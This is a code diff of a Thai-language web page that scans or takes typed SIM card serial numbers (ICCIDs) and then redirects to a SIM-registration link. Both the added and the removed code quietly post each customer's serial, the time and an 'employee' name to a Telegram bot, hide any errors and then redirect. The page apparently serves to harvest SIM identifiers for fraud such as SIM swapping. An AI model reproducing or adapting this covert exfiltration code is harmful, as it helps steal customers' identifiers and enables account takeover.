+  const s=raw.replace(/[\s\-]/g,'');
+  const m=s.match(/8966\d{12,}/); if(m) return m[0].slice(0,18);
+  const m2=s.match(/\d{16,18}/);  if(m2) return m2[0];
   return null;
 }
 
-/* ── on serial found ── */
-async function onSerial(serial) {
-  sendTelegram(serial);   // fire & forget
-  doRedirect();
-}
-
-async function sendTelegram(serial) {
-  if (!TG_BOT || !TG_CHAT) return;
-  const now   = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok', hour12: false });
-  const agent = TG_AGENT ? `\n👤 พนักงาน: ${TG_AGENT}` : '';
-  const text  = `📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}${agent}`;
-  try {
-    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text }),
-    });
-  } catch (e) {}
-}
-
-function doRedirect() {
-  window.location.href = 'https://iservice.page.link/iService-SIMRegister';
-}
-
-/* ── manual entry ── */
-function submitManual() {
-  const serial = document.getElementById('manSerial').value.replace(/\D/g, '');
-  if (serial.length < 10) { showToast('กรุณากรอกเลขซีเรียลให้ครบ'); return; }
-  document.getElementById('btnSubmit').disabled = true;
+async function onSerial(serial){
+  showToast('✅ สแกนสำเร็จ!');
   sendTelegram(serial);
-  setTimeout(doRedirect, 300);
+  setTimeout(doRedirect, 600);
 }
 
-/* ── init ── */
-window.addEventListener('load', () => setTimeout(openSheet, 500));
+async function sendTelegram(serial){
+  if(!TG_BOT||!TG_CHAT) return;
+  const now=new Date().toLocaleString('th-TH',{timeZone:'Asia/Bangkok',hour12:false});
+  const agent=TG_AGENT?`\n👤 พนักงาน: ${TG_AGENT}`:'';
+  const text=`📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}${agent}`;
+  try{
+    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:TG_CHAT,text})
+    });
+  }catch(e){}
+}
+
+function doRedirect(){ window.location.href='https://iservice.page.link/iService-SIMRegister'; }
+
+function submitManual(){
+  const serial=document.getElementById('manSerial').value.replace(/\D/g,'');
+  if(serial.length<10){showToast('กรุณากรอกเลขซีเรียลให้ครบ');return;}
+  document.getElementById('btnSub').disabled=true;
+  sendTelegram(serial);
+  setTimeout(doRedirect,300);
+}
+
+window.addEventListener('load',()=>setTimeout(openSheet,400));
 </script>
 </body>
 </html>
